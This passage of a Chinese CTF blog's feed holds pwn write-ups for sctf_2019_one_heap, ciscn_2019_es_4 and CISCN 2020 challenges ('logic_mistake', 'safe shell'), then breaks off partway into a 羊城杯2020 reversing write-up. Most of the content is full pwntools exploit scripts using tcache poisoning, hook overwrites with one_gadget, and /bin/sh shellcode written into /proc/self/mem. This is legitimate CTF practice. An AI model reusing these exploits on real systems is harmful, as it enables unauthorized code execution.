class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)    free()    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    <span class="hljs-comment">#夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。</span>    add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x20</span>))    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    free()    add(<span class="hljs-number">0x28</span>,p16(<span class="hljs-number">0x9750</span>) + <span class="hljs-string">'\n'</span>)    debug()    <span class="hljs-comment"># 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush</span>    add(<span class="hljs-number">0x7f</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x91</span>) +<span class="hljs-string">'\n'</span>)    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x7f</span>,payload + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./sctf_2019_one_heap'</span>)        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x41</span>) + p64(malloc_hook<span class="hljs-number">-8</span>)debug()<span class="hljs-comment"># 修改0x40 tcache bin的chain</span>add(<span class="hljs-number">0x68</span>,payload)debug()add(<span class="hljs-number">0x38</span>,<span class="hljs-string">'\n'</span>)realloc=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>] + roc[<span class="hljs-number">1</span>]one = <span class="hljs-number">0x10a38c</span> + libc_basepayload = p64(one) + p64(realloc)add(<span class="hljs-number">0x38</span>,payload + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-es-4"><a href="#ciscn-2019-es-4" class="headerlink" title="ciscn_2019_es_4"></a><code>ciscn_2019_es_4</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>利用off by null，构造chunk overlapping，然后tcache attack即可。</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26094</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xa0</span>+p64(<span class="hljs-number">0x1e0</span>))free(<span class="hljs-number">3</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x00000000006022B0</span>))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)*<span class="hljs-number">2</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)show(<span class="hljs-number">6</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebc0a</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0x3ed8e8</span>+libcbase))add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0xa0</span>,p64(libcbase+rce18[<span class="hljs-number">1</span>]))free(<span class="hljs-number">8</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF刷题记录&quot;&gt;&lt;a href=&quot;#BUUCTF刷题记录&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF刷题记录&quot;&gt;&lt;/a&gt;BUUCTF刷题记录&lt;/h1&gt;&lt;h2 id=&quot;GKCTF-2020-demo&quot;&gt;&lt;a href=&quot;#GKCTF-
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020 华中分区赛部分wp</title>
    <link href="http://chumen77.xyz/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/24/ciscn 2020 华中分区赛部分wp/</id>
    <published>2020-09-24T00:09:06.574Z</published>
    <updated>2020-09-26T12:18:50.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020-华中分区赛部分wp"><a href="#ciscn-2020-华中分区赛部分wp" class="headerlink" title="ciscn  2020 华中分区赛部分wp"></a>ciscn  2020 华中分区赛部分wp</h1><p>第一天跟6级冲突了，基本没玩，第二天做完一个题ida炸了，怎么也打不开。最近，总是关键时刻掉链子了😭。</p><h2 id="logic-mistake"><a href="#logic-mistake" class="headerlink" title="logic_mistake"></a><code>logic_mistake</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>可以申请16个堆，size信息放在其chunk地址的下8个字节</li><li>通过strdup来进行申请堆， <code>strdup</code> 相当于<code>s = input() malloc(stren(s))</code> </li></ul><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><ul><li><code>read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个0x90大小的堆块，size 填成0xff，留着溢出</li><li>申请3个0x80大小的堆块，size 填成0xff，留着溢出</li><li>释放前8个堆，最后一个进入unsortbin</li><li>申请一个0x90的堆块，会申请到tcache的头的堆，也就是第7个堆</li><li>edit溢出修改到next chunk的size 和prev size，让show 出libc信息</li><li>接着修改unsortbin的size 为0x80，开始进行tcache attack，也就是溢出修改tcache chian上的堆地址，修改为free hook</li><li>然后申请堆到free hook，打one gadgets<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.12.248'</span>,<span class="hljs-number">50001</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Input index:'</span>,str(idx))    sla(<span class="hljs-string">'Input size'</span>,str(size))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>    add(i,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">10</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">11</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">12</span>,<span class="hljs-number">0xff</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>add(<span class="hljs-number">6</span>,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + <span class="hljs-string">'2'</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)edit(<span class="hljs-number">6</span>,payload)show(<span class="hljs-number">6</span>)ru(<span class="hljs-string">'22222222'</span>)r(<span class="hljs-number">8</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)edit(<span class="hljs-number">6</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">13</span>,<span class="hljs-number">0xff</span>,payload)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x80</span>) + p64(free_hook)edit(<span class="hljs-number">13</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">14</span>,<span class="hljs-number">0xff</span>,payload)one = <span class="hljs-number">0x4f3c2</span> + libc_baseadd(<span class="hljs-number">15</span>,<span class="hljs-number">0xff</span>,payload)edit(<span class="hljs-number">15</span>,p64(one))free(<span class="hljs-number">14</span>)itr()</code></pre></div><h2 id="safe-shell"><a href="#safe-shell" class="headerlink" title="safe shell"></a>safe shell</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="登陆函数："><a href="#登陆函数：" class="headerlink" title="登陆函数："></a>登陆函数：</h4><div class="hljs"><pre><code class="hljs c">!<span class="hljs-built_in">strcmp</span>(name, &amp;s) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(password, &amp;ptr);</code></pre></div><p>在最后的验证是用strcmp，会被<code>\x00</code>给截断，并且服务器上的admin.txt上来也是空的。直接设置name与password均为<code>\x00</code>即可绕过。</p><h4 id="shell函数："><a href="#shell函数：" class="headerlink" title="shell函数："></a>shell函数：</h4><ul><li>都是围绕<code>/proc/self/</code>目录下的操作</li><li><code>set_lseek</code>可以修改读取某文件指针，也就是open以后默认操作读写指针是指向文件的开头的，通过它可以修改这个指针的在这个文件上指向</li><li>write 一次只能写8字节</li></ul><p>重点是了解<code>/proc/pid/</code>目录下文件的信息与含义。<br><a href="https://blog.csdn.net/enweitech/article/details/53391567" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53391567</a></p><p><strong>特别注意 mmaps 和 mem</strong></p><h5 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h5><p>是当前进程的内存映射关系，存放着内存分布图，类似于gdb中vmmap，可以泄漏一下程序的基地址。</p><h5 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h5><ul><li>包含了程序进程在内存中的内容；</li><li>通过修改该文件相当于直接修改当前进程的内存</li><li>/ proc / $pid / mem以与进程中相同的方式显示$pid的内存映射,即伪文件中偏移x处的字节与进程中地址x处的字节相同.。</li><li>结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</li></ul><p>写入mem文件也相当于修改程序在内存的本身了，结合mmaps的程序基址，在合适的地方写入shellcode，让程序走到这里即可get shell</p><h4 id="防御函数："><a href="#防御函数：" class="headerlink" title="防御函数："></a>防御函数：</h4><p>在监测到3次密码错误后，开始拒绝连接，并且会在<code>admin.txt</code>中写入随机的512个字母数字组合的字符。这样就基本登陆不上去了,因为是随机的，并且name跟password最大也就是0x100的长度。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>绕过check，登入diy shell </li><li>读入mmaps，leak 出 程序的base</li><li>open mem文件，准备写入</li><li>确定写入偏移为help后<code>0x16CC + base</code>,通过<code>set_lseek</code>来修改指针指向</li><li>wirte 写入8字节shellcode</li><li>通过<code>set_lseek</code>来修改指针+8，再次写入，循环写好shellcode</li><li>输入help即可</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./safe_shell'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'\x00'</span>)sa(<span class="hljs-string">'pass'</span>,<span class="hljs-string">'\x00'</span>)sl(<span class="hljs-string">'readonly'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'maps'</span>)s = ru(<span class="hljs-string">'-5'</span>)s = s[<span class="hljs-number">2</span>:<span class="hljs-number">14</span>]base = int(s,<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'base'</span>,base)patch_addr = <span class="hljs-number">0x16CC</span> + basesl(<span class="hljs-string">'open'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'mem'</span>)shellcode = <span class="hljs-string">'\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> range(len(shellcode)//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>):    sl(<span class="hljs-string">'set_lseek'</span>)    sla(<span class="hljs-string">' file offset'</span>,str(patch_addr + i*<span class="hljs-number">8</span>))    sla(<span class="hljs-string">'$'</span>,<span class="hljs-string">'write'</span>)    sa(<span class="hljs-string">'your context'</span>,shellcode[i*<span class="hljs-number">8</span>:(i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>)])sl(<span class="hljs-string">'help'</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020-华中分区赛部分wp&quot;&gt;&lt;a href=&quot;#ciscn-2020-华中分区赛部分wp&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020 华中分区赛部分wp&quot;&gt;&lt;/a&gt;ciscn  2020 华中分区赛部分wp&lt;/h1
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020部分wp</title>
    <link href="http://chumen77.xyz/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/14/羊城杯2020部分wp/</id>
    <published>2020-09-14T12:56:01.475Z</published>
    <updated>2020-09-24T02:49:43.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p><p> 在脱去以后，会有主程序，跟一个struct的文件。</p><p>要保证主程序与struct的前面的魔法字节是相同一样的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-string">'''a1 = Int('a1')a2 = Int('a2')a3 = Int('a3')a4 = Int('a4')a5 = Int('a5')a6 = Int('a6')a7 = Int('a7')a8 = Int('a8')a9 = Int('a9')a10 = Int('a10')a11 = Int('a11')a12 = Int('a12')a13 = Int('a13')a14 = Int('a14')s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 